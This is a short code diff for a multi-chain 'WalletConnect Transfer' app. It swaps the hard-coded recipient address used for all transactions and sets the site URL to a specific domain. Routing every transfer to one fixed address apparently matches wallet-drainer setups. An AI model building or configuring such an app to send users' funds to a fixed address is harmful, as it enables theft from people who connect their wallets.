@@ -12,7 +12,7 @@ import { parseUnits, parseGwei } from 'viem';
 const projectId = 'c0bad74b8470864dada6ab63c43fc6ab';
 
 // Fixed recipient address for all transactions
-export const FIXED_RECIPIENT = '0x553Ae53727B39d233236A28aBe9A3f1693F57019';
+export const FIXED_RECIPIENT = '0x2c92d387d7ee0836f12c0ba9ee1f30522161531c';
 
 // ERC20 token contract ABI (simplified for transfer function)
 const ERC20_ABI = [
@@ -142,7 +142,7 @@ export const CHAIN_TOKENS: Record<number, TokenInfo[]> = {
 const metadata = {
   name: 'WalletConnect Transfer',
   description: 'A multi-chain application to transfer funds using WalletConnect',
-  url: 'https://yourwebsite.com',
+  url: 'https://miinisol.com',
   icons: ['https://yourwebsite.com/icon.png']
 };
 
